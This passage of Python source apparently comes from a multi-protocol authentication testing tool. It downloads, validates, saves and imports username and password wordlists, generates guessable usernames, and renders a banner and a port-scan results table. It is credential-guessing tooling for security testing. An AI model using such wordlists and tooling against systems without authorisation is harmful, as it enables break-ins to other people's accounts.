                            if (len(valid_lines) < 2 and total_lines > 5) or valid_ratio < 0.3:
                                print(f"{Colors.ERROR}Content does not appear to be a wordlist format (not enough valid entries)")
                                print(f"{Colors.INFO}Found only {len(valid_lines)} valid lines out of {total_lines} total lines")
                                
                                if has_long_lines:
                                    print(f"{Colors.WARNING}Found {len(long_lines)} unusually long lines (>200 chars)")
                                if has_suspiciously_long:
                                    print(f"{Colors.ERROR}Found {len(suspiciously_long_lines)} extremely long lines (>500 chars)")
                                    print(f"{Colors.WARNING}Content appears to be invalid or an error page")
                                    if os.path.exists(temp_file):
                                        os.remove(temp_file)
                                        print(f"{Colors.INFO}Removed suspicious content file: {temp_file}")
                                    continue
                            # Analyze first chunk for telltale signs of error pages
                            error_signatures = [
                                # Most explicit error indicators first
                                '<title>404', '<title>Error', 'Page Not Found',
                                'Error Page', '404 Not Found', 'File Not Found',
                                # HTML error page structure
                                ('<!DOCTYPE html' in content_sample and 'Error' in content_sample),
                                ('<html' in content_sample and 'Error' in content_sample),
                                ('<html' in content_sample and '404' in content_sample),
                                # GitHub specific errors
                                ('GitHub' in content_sample and '404' in content_sample)
                            ]
                            
                            # Fail early if we detect clear error signatures
                            if any(error_signatures):
                                print(f"{Colors.ERROR}Error page detected in content - skipping download")
                                print(f"{Colors.INFO}This appears to be an error page rather than a wordlist")
                                continue
                            
                            # Check the first few lines for a quick validation
                            first_lines = content_sample.split('\n')[:15]  # Look at more lines
                            first_lines_text = '\n'.join(first_lines)
                            
                            # Enhanced check for error patterns with more comprehensive detection
                            # Group error indicators by type for better maintainability
                            html_indicators = [
                                "<!doctype", "<html", "<head", "<body", "<div", "<script", "<meta", 
                                "<link", "<title", "<!DOCTYPE", "<span", "<img", "href=", "<style",
                                "<form", "<iframe", "<a href", "<p>", "<br", "<strong>", "<h1", "<h2", 
                                "<h3", "<table", "<tr", "<td", "<ul", "<li", "<nav", "<header", "<footer",
                                "<html>", "</html>", "<script>", "</script>"
                            ]
                            
                            error_messages = [
                                # HTTP error phrases
                                "404", "not found", "error", "exception", "page not found", 
                                "does not exist", "file not found", "cannot be found", 
                                "could not be found", "unavailable", "unauthorized", 
                                "access denied", "forbidden", "bad request", "server error", 
                                "internal server", "service unavailable", "problem",
                                "couldn't find", "couldn't locate", "couldn't access",
                                
                                # Common GitHub error messages
                                "this is not the web page you are looking for",
                                "sorry, we couldn't find that page",
                                "sorry, this page could not be found",
                                "sorry, that page does not exist",
                                "file or directory not found",
                                "repository does not exist"
                            ]
                            
                            # Specific site indicators that might appear in error pages
                            site_indicators = [
                                "github.com", "githubusercontent.com", "raw.githubusercontent",
                                "<title>GitHub</title>", "<title>404", "<title>Error",
                                "gitHub Pages"
                            ]
                            
                            # Convert to lowercase once for efficient checking
                            sample_lower = content_sample.lower()
                            first_lines_lower = first_lines_text.lower()
                            
                            # More efficient checks using the lowercase sample
                            html_found = any(tag in sample_lower for tag in html_indicators)
                            error_found = any(msg in sample_lower for msg in error_messages)
                            github_error = (
                                any(site in sample_lower for site in site_indicators) and 
                                ("404" in sample_lower or "not found" in sample_lower)
                            )
                            
                            # Additional check for HTML structure (a single comprehensive check)
                            html_pattern_found = (
                                ("<html" in sample_lower and "</html" in sample_lower) or
                                ("<!doctype" in sample_lower) or
                                ("<head" in sample_lower and "<body" in sample_lower) or
                                ("<title>" in sample_lower and "</title>" in sample_lower)
                            )
                            
                            # Track what type of error we found for better reporting
                            detected_error = None
                            if html_found or html_pattern_found:
                                detected_error = "HTML content"
                            elif error_found:
                                detected_error = "Error message"
                            elif github_error:
                                detected_error = "GitHub error page"
                            
                            if detected_error or html_found or html_pattern_found or error_found or github_error:
                                # Found some kind of error indicator - log detailed information
                                if detected_error:
                                    print(f"{Colors.ERROR}Detected error content: '{detected_error}'")
                                
                                # Count number of HTML tags as additional evidence
                                html_tag_count = sample_lower.count('<') + sample_lower.count('>')
                                if html_tag_count > 4:  # More than a few HTML tags
                                    print(f"{Colors.ERROR}HTML tag count: {html_tag_count} (high HTML content)")
                                
                                # More detailed checks for common error page patterns
                                if "<html" in sample_lower and "404" in sample_lower:
                                    print(f"{Colors.ERROR}Detected standard 404 error page")
                                elif "<html" in sample_lower and "not found" in sample_lower:
                                    print(f"{Colors.ERROR}Detected 'not found' error page")
                                elif "github" in sample_lower and ("404" in sample_lower or "not found" in sample_lower):
                                    print(f"{Colors.ERROR}Detected GitHub error page")
                                    print(f"{Colors.INFO}For GitHub files, use the 'raw' URL, not the web page URL")
                                
                                # Log a sample of the problematic content for debugging
                                sample_lines = content_sample.split("\n")[:5]
                                print(f"{Colors.SUBTLE}First few lines of content:")
                                for line in sample_lines:
                                    print(f"{Colors.SUBTLE}  {line[:80]}{'...' if len(line) > 80 else ''}")
                                
                                # More comprehensive validation using our validation function
                                if not self._is_valid_wordlist_content(content_sample):
                                    print(f"{Colors.ERROR}Error: Content from {url} failed content validation.")
                                    
                                    # Log a sample of the problematic content for debugging
                                    sample_lines = content_sample.split("\n")[:5]
                                    print(f"{Colors.SUBTLE}First few lines of content:")
                                    for line in sample_lines:
                                        print(f"{Colors.SUBTLE}  {line[:80]}{'...' if len(line) > 80 else ''}")
                                    
                                    # Count HTML tags as additional evidence
                                    html_tag_count = content_sample.lower().count('<') + content_sample.lower().count('>')
                                    if html_tag_count > 4:
                                        print(f"{Colors.ERROR}HTML tag count: {html_tag_count} (high HTML content)")
                                    
                                    # Check for common content types in a wordlist file
                                    valid_lines = [line for line in content_sample.split('\n') 
                                                  if line.strip() and '<' not in line and len(line) < 200]
                                    if len(valid_lines) < 2:
                                        print(f"{Colors.ERROR}Very few valid lines found ({len(valid_lines)})")
                                    
                                    # Skip this URL and continue with the next one
                                    print(f"{Colors.WARNING}Skipping download due to invalid content")
                                    continue
                        except Exception as e:
                            print(f"{Colors.WARNING}Error validating content sample: {str(e)}")
                            print(f"{Colors.WARNING}Will attempt to download and validate full content.")
                        
                        # Do one final validation check with _is_valid_wordlist_content before proceeding
                        if not self._is_valid_wordlist_content(content_sample):
                            print(f"{Colors.ERROR}Error: Content validation failed - appears to be an error page")
                            print(f"{Colors.INFO}This might be a 404 page that returns 200 status code")
                            
                            # Show first few lines of content
                            first_lines = content_sample.split('\n')[:3]
                            if first_lines:
                                print(f"{Colors.SUBTLE}Content sample:")
                                for line in first_lines:
                                    if line.strip():
                                        print(f"{Colors.SUBTLE}  {line[:60]}{'...' if len(line) > 60 else ''}")
                            continue
                            
                        # One last check for common error patterns in the content
                        error_patterns = ["404", "not found", "error", "<html", "<!doctype"]
                        if any(pattern in content_sample.lower() for pattern in error_patterns):
                            pattern_found = next(pattern for pattern in error_patterns if pattern in content_sample.lower())
                            print(f"{Colors.ERROR}Error: Found error pattern '{pattern_found}' in content")
                            print(f"{Colors.INFO}This appears to be an error page with 200 status code")
                            continue
                        
                        # If all validation passes, now download the full content with improved error handling
                        print(f"{Colors.SUCCESS}Content validation passed - writing file...")
                        valid_download = True  # Reset this flag before downloading
                        
                        try:
                            with open(temp_file, 'wb') as f:
                                with tqdm(total=total_size, unit='B', unit_scale=True,
                                        desc=f"{Colors.PRIMARY}Progress",
                                        bar_format="{l_bar}{bar:30}{r_bar}") as pbar:
                                    # First write the content sample we already validated
                                    if content_chunk:
                                        f.write(content_chunk)
                                        pbar.update(len(content_chunk))
                                        total_bytes_downloaded += len(content_chunk)
                                    
                                    # Then continue with the rest of the content with improved chunking
                                    try:
                                        for chunk in response.iter_content(chunk_size=16384):  # Larger chunk size for better performance
                                            if not chunk:  # Skip empty chunks
                                                continue
                                            
                                            # Update total bytes downloaded
                                            total_bytes_downloaded += len(chunk)
                                            
                                            # Write chunk directly to file (we already validated content)
                                            f.write(chunk)
                                            
                                            # Update progress bar with chunk size
                                            pbar.update(len(chunk))
                                    except requests.exceptions.ChunkedEncodingError as e:
                                        print(f"{Colors.WARNING}Warning: Chunked encoding error: {str(e)}")
                                        print(f"{Colors.INFO}Downloaded {total_bytes_downloaded} bytes before error")
                                        # We'll continue and try to process what we have
                                    except requests.exceptions.ConnectionError as e:
                                        print(f"{Colors.WARNING}Warning: Connection error during download: {str(e)}")
                                        # If we downloaded enough data, we might still process it
                                        if total_bytes_downloaded < 1000:  # Not enough data
                                            raise  # Re-raise to be caught by outer exception handler
                        except IOError as e:
                            print(f"{Colors.ERROR}Error writing to file: {str(e)}")
                            # Clean up any partial file
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                            continue
                        
                        # If validation failed, clean up and skip
                        if not valid_download:
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                                print(f"{Colors.INFO}Removed invalid temporary file: {temp_file}")
                            print(f"{Colors.WARNING}Skipping URL due to validation failure: {url}")
                            continue
                            
                        # Check if we got any data at all
                        if total_bytes_downloaded == 0:
                            print(f"{Colors.WARNING}Warning: No data downloaded from {url}")
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                            continue
                        
                        # Additional content validation after download is complete
                        print(f"{Colors.PRIMARY}Final validation of downloaded content...")
                        valid_content = False
                        html_line_count = 0
                        error_line_count = 0
                        total_lines = 0
                        valid_lines = 0
                        suspicious_line_count = 0
                        
                        # Check file size - if extremely small, it might still be an error page
                        file_size = os.path.getsize(temp_file)
                        if file_size < 100:  # Less than 100 bytes
                            print(f"{Colors.ERROR}Error: Downloaded file is suspiciously small ({file_size} bytes)")
                            print(f"{Colors.INFO}This might be an error response")
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                                print(f"{Colors.INFO}Removed suspicious file: {temp_file}")
                            continue
                        
                        # Define detection patterns for better error identification
                        html_patterns = ['<html', '<body', '<head', '<title', '<div', '<span', '<script']
                        error_patterns = ['404', 'not found', 'error', 'exception', 'page not found', 
                                         'file not found', 'does not exist', 'could not be found',
                                         'server error', 'client error', 'forbidden', 'unauthorized']
                        github_patterns = ['github', 'repository', 'githubusercontent']
                        valid_lines = 0
                        
                        # Define comprehensive error pattern indicators
                        error_indicators = [
                            "404", "not found", "error", "exception", "problem",
                            "unauthorized", "forbidden", "denied", "unavailable",
                            "bad request", "server error", "internal server",
                            "could not", "cannot be", "doesn't exist", "does not exist",
                            "not available", "page not found", "file not found"
                        ]
                        # Process the downloaded file line by line with enhanced validation
                        with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
                                    
                                total_lines += 1
                                
                                # Better detection of HTML content
                                if any(pattern in line.lower() for pattern in html_patterns):
                                    html_line_count += 1
                                    # Higher weight for definite HTML tags
                                    if "<html" in line.lower() or "<!doctype" in line.lower():
                                        html_line_count += 2  # Count more significant HTML markers with higher weight
                                    continue
                                    
                                # Look for HTML-like patterns more generally
                                if "<" in line and ">" in line:
                                    html_line_count += 1
                                    continue
                                
                                # Check if line contains any error indicators
                                if any(indicator.lower() in line.lower() for indicator in error_indicators):
                                    error_line_count += 1
                                    continue
                                    
                                # Skip extremely long lines (likely not valid wordlist entries)
                                if len(line) > 200:
                                    continue
                                
                                # Add valid line to wordlist
                                url_words.add(line)
                                valid_lines += 1
                                valid_content = True
                        
                        # Additional validation checks for potential HTML/error pages
                        if total_lines > 0:
                            # Check for high proportion of HTML content
                            html_percentage = (html_line_count / total_lines) * 100
                            error_percentage = (error_line_count / total_lines) * 100
                            
                            # More aggressive validation failed if:
                            # 1. Any significant HTML content detected
                            # 2. High percentage of error message lines
                            # 3. Very few valid lines compared to total lines
                            
                            # Calculate more metrics for better validation
                            valid_line_percentage = (valid_lines / total_lines) * 100 if total_lines > 0 else 0
                            bytes_per_valid_line = total_bytes_downloaded / max(valid_lines, 1)
                            
                            # Check for HTML content more aggressively
                            if html_percentage > 10 or html_line_count > 5:  # Lower threshold for HTML content
                                print(f"{Colors.ERROR}File appears to be HTML content: {url}")
                                print(f"{Colors.ERROR}HTML content: {html_percentage:.1f}% of lines contain HTML tags ({html_line_count} lines)")
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                                    print(f"{Colors.INFO}Removed HTML content file: {temp_file}")
                                continue
                            
                            if error_percentage > 10:  # More than 10% error message lines
                                print(f"{Colors.WARNING}Warning: File appears to contain error messages: {url}")
                                print(f"{Colors.WARNING}Error content: {error_percentage:.1f}% of lines contain error indicators")
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                                continue
                                
                            # If less than 15% of total lines are valid wordlist entries, it's suspicious
                            if valid_line_percentage < 15 and total_lines > 10:
                                print(f"{Colors.ERROR}Very few valid lines ({valid_line_percentage:.1f}%) in content from {url}")
                                print(f"{Colors.ERROR}Content appears to be an error page that passed previous validation")
                                print(f"{Colors.INFO}Expected: One simple word/phrase per line")
                                print(f"{Colors.INFO}Found: {valid_lines} valid lines out of {total_lines} total lines")
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                                    print(f"{Colors.INFO}Removed invalid content file: {temp_file}")
                                continue
                                
                            # Check for suspiciously large files with very few valid entries
                            if bytes_per_valid_line > 1000 and total_bytes_downloaded > 5000:
                                print(f"{Colors.ERROR}File has very high bytes per valid line ratio: {bytes_per_valid_line:.1f}")
                                print(f"{Colors.ERROR}This suggests the file contains a lot of non-wordlist content")
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                                    print(f"{Colors.INFO}Removed suspicious content file: {temp_file}")
                                continue
                        
                        # Verify we got valid content
                        if not valid_content or len(url_words) < 2:  # Require at least 2 valid entries
                            print(f"{Colors.WARNING}Warning: No valid entries found in {url}")
                            print(f"{Colors.WARNING}Found {len(url_words)} valid entries, minimum required is 2")
                            # Remove temporary file
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                            continue
                            
                        # Additional check for extremely small wordlists (potential errors)
                        if len(url_words) < 10 and total_size > 1000:
                            print(f"{Colors.WARNING}Warning: Suspiciously small wordlist ({len(url_words)} entries) from {url}")
                            print(f"{Colors.WARNING}Downloaded {total_bytes_downloaded} bytes but only found {len(url_words)} entries")
                            
                            # Calculate bytes per entry - very high values often indicate error pages
                            bytes_per_entry = total_bytes_downloaded / max(len(url_words), 1)
                            print(f"{Colors.WARNING}Bytes per entry: {bytes_per_entry:.1f} bytes")
                            
                            if bytes_per_entry > 1000:  # Very high bytes per entry usually means error page
                                print(f"{Colors.ERROR}Error: Extremely high bytes per entry ratio suggests this is not a valid wordlist")
                                print(f"{Colors.ERROR}This is likely an error page that passed previous validation checks")
                                if os.path.exists(temp_file):
                                    os.remove(temp_file)
                                continue
                                
                            print(f"{Colors.WARNING}This could indicate an error page that passed validation checks")
                            
                            # Check ratio of valid lines to total lines
                            if valid_lines > 0 and total_lines > 0:
                                valid_ratio = (valid_lines / total_lines) * 100
                                print(f"{Colors.INFO}Valid content ratio: {valid_ratio:.1f}% ({valid_lines}/{total_lines} lines)")
                                
                                # If less than 30% of the file contains valid entries, it's probably an error page
                                if valid_ratio < 30 and total_lines > 20:
                                    print(f"{Colors.ERROR}Error: Very low valid content ratio suggests this is not a valid wordlist")
                                    print(f"{Colors.ERROR}This is likely an error page that passed previous validation checks")
                                    if os.path.exists(temp_file):
                                        os.remove(temp_file)
                                    continue
                                
                            # Check content further for potential error indicators
                            suspicious = False
                            suspicious_words = []
                            
                            # Check each word for suspicious patterns
                            for word in url_words:
                                if (len(word) > 100 or 
                                    "<!DOCTYPE" in word or 
                                    "<html" in word or 
                                    "404" in word or
                                    "not found" in word.lower() or
                                    ("error" in word.lower() and len(word) > 30) or
                                    ("<" in word and ">" in word)):
                                    suspicious = True
                                    suspicious_words.append(word[:50] + ("..." if len(word) > 50 else ""))
                                    if len(suspicious_words) >= 3:  # Limit to 3 examples
                                        break
                                    
                            if suspicious:
                                print(f"{Colors.ERROR}Content appears to be an error page despite passing validation")
                                # Show examples of suspicious words
                                for i, word in enumerate(suspicious_words):
                                    print(f"{Colors.ERROR}Suspicious content {i+1}: {word}")
                                
                                # Ask user if they want to keep the content
                                try:
                                    choice = input(f"{Colors.PRIMARY}Keep this content anyway? (y/n): {Colors.INFO}").strip().lower()
                                    if choice != 'y':
                                        print(f"{Colors.WARNING}Discarding suspicious content from {url}")
                                        # Remove the temporary file
                                        if os.path.exists(temp_file):
                                            os.remove(temp_file)
                                        continue
                                except KeyboardInterrupt:
                                    print(f"\n{Colors.WARNING}Operation cancelled")
                                    # Remove the temporary file
                                    if os.path.exists(temp_file):
                                        os.remove(temp_file)
                                    raise
                            
                            # If we get here, file is small but doesn't look suspicious
                            print(f"{Colors.INFO}Using content despite small size (manual review recommended)")
                        
                        # Success message with detailed information
                        print(f"{Colors.SUCCESS}Successfully downloaded {len(url_words):,} valid entries from {url}")
                        
                        # Update the total set of words
                        all_words.update(url_words)
                        print(f"{Colors.SUCCESS}Added {len(url_words):,} {list_type} entries from {url}")
                        download_success = True
                        
                    except requests.exceptions.RequestException as e:
                        error_type = type(e).__name__
                        if isinstance(e, requests.exceptions.Timeout):
                            print(f"{Colors.ERROR}Timeout error downloading from {url}: Connection timed out")
                        elif isinstance(e, requests.exceptions.ConnectionError):
                            print(f"{Colors.ERROR}Connection error downloading from {url}: Could not connect to server")
                        elif isinstance(e, requests.exceptions.TooManyRedirects):
                            print(f"{Colors.ERROR}Redirect error downloading from {url}: Too many redirects")
                        else:
                            print(f"{Colors.ERROR}Network error downloading from {url}: {error_type} - {str(e)}")
                        # Clean up temporary file if it exists
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
                            print(f"{Colors.INFO}Removed temporary file after network error: {temp_file}")
                    except UnicodeDecodeError as e:
                        print(f"{Colors.ERROR}Error decoding content from {url}: {str(e)}")
                        print(f"{Colors.WARNING}The file might be binary or use an unsupported encoding")
                        # The file might be corrupted or not a text file
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
                            print(f"{Colors.INFO}Removed temporary file after decoding error: {temp_file}")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.WARNING}Download interrupted by user")
                        # Clean up temporary file if interrupted
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
                            print(f"{Colors.INFO}Removed temporary file after interruption: {temp_file}")
                        # Re-raise to exit the loop
                        raise
                
                # If we reach here, all URLs for this list type have been processed
                # Save the combined words if at least one download was successful
                if download_success and all_words:
                    self._save_wordlist_to_file(filename, all_words, list_type)
                else:
                    print(f"{Colors.ERROR}Failed to download any {list_type} data from provided URLs")
                    
                # Clean up any remaining temporary files for this list type
                for temp_file in temp_files:
                    if os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                            print(f"{Colors.SUBTLE}Cleaned up temporary file: {temp_file}")
                        except Exception as e:
                            print(f"{Colors.WARNING}Failed to remove temporary file {temp_file}: {str(e)}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}Downloads interrupted by user")
            # If we have any downloaded words, ask if we should continue saving them
            if 'list_type' in locals() and 'all_words' in locals() and 'download_success' in locals() and 'filename' in locals():
                if download_success and all_words:
                    try:
                        print(f"\n{Colors.INFO}Some words were already downloaded. Save {len(all_words):,} entries? (y/n):")
                        choice = input(f"{Colors.PRIMARY}┌──({Colors.INFO}PR0T0X{Colors.PRIMARY})-[{Colors.INFO}save{Colors.PRIMARY}]\n└─$ {Colors.INFO}").strip().lower()
                        if choice == 'y':
                            # Proceed with saving
                            self._save_wordlist_to_file(filename, all_words, list_type)
                        else:
                            print(f"{Colors.WARNING}Discarding downloaded words")
                    except:
                        # If any error occurs while asking, default to not saving
                        print(f"{Colors.WARNING}Error during prompt, discarding downloaded words")
            
            # Clean up any remaining temporary files
            if 'temp_files' in locals():
                for temp_file in temp_files:
                    if os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                            print(f"{Colors.INFO}Cleaned up temporary file after interruption: {temp_file}")
                        except Exception as e:
                            print(f"{Colors.WARNING}Failed to remove temporary file {temp_file}: {str(e)}")
        
        except Exception as e:
            print(f"{Colors.ERROR}Error during download: {str(e)}")
            # Clean up any remaining temporary files on error
            if 'temp_files' in locals():
                for temp_file in temp_files:
                    if os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                            print(f"{Colors.INFO}Cleaned up temporary file after error: {temp_file}")
                        except Exception as cleanup_err:
                            print(f"{Colors.WARNING}Failed to remove temporary file {temp_file}: {str(cleanup_err)}")

    def _save_wordlist_to_file(self, filename, words, list_type):
        """
        Save a set of words to a file with proper error handling
        """
        final_temp_file = f"{filename}.final.tmp"
        try:
            # Display summary before saving
            print(f"\n{Colors.INFO}Preparing to save {list_type} wordlist:")
            print(f"{Colors.PRIMARY}├─ Total unique entries: {len(words):,}")
            print(f"{Colors.PRIMARY}├─ Output file: {filename}")
            
            # Save to final temporary file
            with open(final_temp_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(sorted(words)))
                
            # Rename to final filename
            if os.path.exists(filename):
                os.remove(filename)
            os.rename(final_temp_file, filename)
            
            print(f"{Colors.SUCCESS}Saved {len(words):,} {list_type} entries to {filename}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}Error saving {list_type} to file: {str(e)}")
            # Attempt to clean up
            if os.path.exists(final_temp_file):
                try:
                    os.remove(final_temp_file)
                    print(f"{Colors.INFO}Removed temporary file after save error: {final_temp_file}")
                except Exception as cleanup_err:
                    print(f"{Colors.WARNING}Failed to clean up temporary file: {str(cleanup_err)}")
            return False

    def load_local_lists(self):
        """Load wordlists from local files"""
        try:
            for list_type, filename in self.local_files.items():
                if os.path.exists(filename):
                    with open(filename, 'r', encoding='utf-8') as f:
                        words = [line.strip() for line in f if line.strip()]
                        if list_type == 'usernames':
                            self.usernames = words
                        else:
                            self.passwords = words
                    print(f"{Colors.SUCCESS}Loaded {len(words):,} {list_type} from {filename}")
                else:
                    print(f"{Colors.WARNING}{filename} not found, will use default lists if needed")
        except Exception as e:
            print(f"{Colors.ERROR}Error loading wordlists: {str(e)}")

    def import_custom_wordlist(self, source_path, list_type, mode='append'):
        """Import a custom wordlist from a local file
        
        Args:
            source_path (str): Path to the custom wordlist file
            list_type (str): Type of wordlist ("usernames" or "passwords")
            mode (str): Import mode ('append' or 'replace')
            
        Returns:
            dict: Import results containing counts and status
        """
        try:
            if not os.path.exists(source_path):
                print(f"{Colors.ERROR}Error: File not found: {source_path}")
                return None
                
            if list_type not in ["usernames", "passwords"]:
                print(f"{Colors.ERROR}Error: Invalid list type. Must be 'usernames' or 'passwords'")
                return None
                
            # Read the custom wordlist
            print(f"\n{Colors.INFO}Reading custom wordlist from: {source_path}")
            with open(source_path, 'r', encoding='utf-8') as f:
                new_words = set(line.strip() for line in f if line.strip())
            
            print(f"{Colors.INFO}Found {len(new_words):,} entries in file")
                
            # Load existing words if in append mode
            existing_file = self.local_files[list_type]
            existing_words = set()
            
            if mode == 'append' and os.path.exists(existing_file):
                with open(existing_file, 'r', encoding='utf-8') as f:
                    existing_words = set(line.strip() for line in f if line.strip())
                    
            # Combine words based on mode
            before_count = len(existing_words)
            
            if mode == 'append':
                combined_words = existing_words.union(new_words)
                added_count = len(combined_words) - before_count
                action_text = "Added to"
            else:  # replace mode
                combined_words = new_words
                added_count = len(new_words)
                action_text = "Replaced"
            
            # Save updated wordlist
            with open(existing_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(sorted(combined_words)))
                
            # Update internal list
            if list_type == "usernames":
                self.usernames = list(combined_words)
            else:
                self.passwords = list(combined_words)
                
            print(f"{Colors.SUCCESS}Successfully {action_text.lower()} wordlist:")
            if mode == 'append':
                print(f"{Colors.SUCCESS}├─ Added {added_count:,} new unique entries")
            else:
                print(f"{Colors.SUCCESS}├─ Replaced with {added_count:,} entries")
            print(f"{Colors.SUCCESS}├─ Total unique entries: {len(combined_words):,}")
            print(f"{Colors.SUCCESS}└─ Saved to: {existing_file}")
            
            return {
                'total': len(combined_words),
                'added': added_count,
                'success': True,
                'mode': mode
            }
            
        except Exception as e:
            print(f"{Colors.ERROR}Error importing wordlist: {str(e)}")
            return None
            
    def import_custom_wordlist_both(self, source_path, mode='append'):
        """Import a custom wordlist as both usernames and passwords
        
        Args:
            source_path (str): Path to the custom wordlist file
            mode (str): Import mode ('append' or 'replace')
            
        Returns:
            dict: Import results for both types
        """
        try:
            if not os.path.exists(source_path):
                print(f"{Colors.ERROR}Error: File not found: {source_path}")
                return None
                
            print(f"\n{Colors.INFO}Importing wordlist as both usernames and passwords ({mode} mode)...")
            
            # Import as usernames
            print(f"{Colors.PRIMARY}├─ Importing as usernames list:")
            usernames_result = self.import_custom_wordlist(source_path, "usernames", mode)
            
            # Import as passwords
            print(f"{Colors.PRIMARY}├─ Importing as passwords list:")
            passwords_result = self.import_custom_wordlist(source_path, "passwords", mode)
            
            if usernames_result and passwords_result:
                action_text = "Added to" if mode == 'append' else "Replaced"
                print(f"\n{Colors.SUCCESS}Import Summary:")
                print(f"{Colors.SUCCESS}├─ Username entries: {len(self.usernames):,} total")
                print(f"{Colors.SUCCESS}├─ Password entries: {len(self.passwords):,} total")
                print(f"{Colors.SUCCESS}└─ Wordlist {action_text.lower()} successfully for both types")
                
                return {
                    'usernames': usernames_result,
                    'passwords': passwords_result,
                    'success': True,
                    'mode': mode
                }
            
            return None
            
        except Exception as e:
            print(f"{Colors.ERROR}Error importing wordlist: {str(e)}")
            return None

    def generate_random_username(self):
        """Generate a random username"""
        try:
            if not self.usernames:
                return "admin"
                
            base = random.choice(self.usernames)
            modifications = [
                lambda x: x,
                lambda x: x + str(random.randint(1, 999)),
                lambda x: x.capitalize(),
                lambda x: x + random.choice(['_admin', '_user', '_test']),
                lambda x: 'admin_' + x,
                lambda x: x + random.choice(['123', '321', '789'])
            ]
            return random.choice(modifications)(base)
        except Exception as e:
            print(f"{Colors.ERROR}Error generating username: {str(e)}")
            return "admin"
class Banner:
    """Manages the program banner"""
    def __init__(self):
        self.ascii_art = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║        ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ██╗  ██╗       ║
║        ██╔══██╗██╔══██╗██╔═████╗╚══██╔══╝██╔═████╗╚██╗██╔╝       ║
║        ██████╔╝██████╔╝██║██╔██║   ██║   ██║██╔██║ ╚███╔╝        ║
║        ██╔═══╝ ██╔══██╗████╔╝██║   ██║   ████╔╝██║ ██╔██╗        ║
║        ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██╔╝ ██╗       ║
║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝       ║
║                                                                  ║
║           Multi-Protocol Authentication Testing Tool             ║
╚══════════════════════════════════════════════════════════════════╝
"""
    def render(self, target_info="No Target", status="OFFLINE", scan_results=None):
        """Render the banner with current information and scan results"""
        # Use a single bright color for better readability
        banner = f"{Style.BRIGHT}{Fore.CYAN}{self.ascii_art}{Style.RESET_ALL}"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        info_box = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║ {Style.BRIGHT}{Fore.WHITE}Target    : {Fore.CYAN}{target_info:<40}          ║
║ {Style.BRIGHT}{Fore.WHITE}Status    : {Colors.SUCCESS if status == "ONLINE" else Colors.ERROR}{status:<40}          ║
║ {Style.BRIGHT}{Fore.WHITE}Time      : {Fore.CYAN}{current_time:<40}          ║
║ {Style.BRIGHT}{Fore.WHITE}Developer : {Fore.CYAN}https://github.com/Boltsky                        ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"""
        
        # Add scan results table if available
        results_table = ""
        if scan_results and len(scan_results) > 0:
            open_ports = sum(1 for info in scan_results.values() if info.get('status', True))
            
            results_table = f"""
{Fore.BLUE}╔═════════════════════════════════ SCAN RESULTS ═════════════════════════════════╗
║  {Style.BRIGHT}{Fore.WHITE}STATUS{Fore.BLUE}  │ {Style.BRIGHT}{Fore.WHITE}PORT{Fore.BLUE}    │ {Style.BRIGHT}{Fore.WHITE}SERVICE{Fore.BLUE}         │ {Style.BRIGHT}{Fore.WHITE}PROTOCOL{Fore.BLUE}        │ {Style.BRIGHT}{Fore.WHITE}TARGET{Fore.BLUE}             ║
╠═══════════╪═════════╪════════════════╪════════════════╪════════════════════╣"""
            for port, info in sorted(scan_results.items()):
                service = info['service'][:13]  # Truncate long service names
                protocol = info['protocol'][:14]  # Truncate long protocol names
                status_icon = f"{Colors.SUCCESS}✓" if info.get('status', True) else f"{Colors.ERROR}✗"
                response_time = f" ({info.get('response_time', 0):.3f}s)" if info.get('status', True) else ""
                
                # Format each row with precise fixed widths and separators
                port_str = f"{port}".ljust(7)
                service_str = f"{service}".ljust(14)
                protocol_str = f"{protocol}".ljust(15)
                target_str = f"{target_info}".ljust(18)
                
                results_table += f"""
║  {status_icon:^6} {Colors.PRIMARY}│ {Colors.SUCCESS if info.get('status', True) else Colors.ERROR}{port_str}{Colors.PRIMARY}│ {Colors.SUCCESS if info.get('status', True) else Colors.ERROR}{service_str}{Colors.PRIMARY}│ {Colors.SUCCESS if info.get('status', True) else Colors.WARNING}{protocol_str}{Colors.PRIMARY}│ {Colors.SUCCESS if info.get('status', True) else Colors.INFO}{target_str}{Colors.PRIMARY}║{Colors.SUCCESS if info.get('status', True) else Colors.SUBTLE}{response_time:>8}{Colors.PRIMARY}"""
            
            # Calculate statistics for summary
            open_count = sum(1 for info in scan_results.values() if info.get('status', True))
            closed_count = len(scan_results) - open_count
            success_rate = (open_count / len(scan_results) * 100) if len(scan_results) > 0 else 0
            
            results_table += f"""
╠═══════════╧═════════╧════════════════╧════════════════╧════════════════════╣
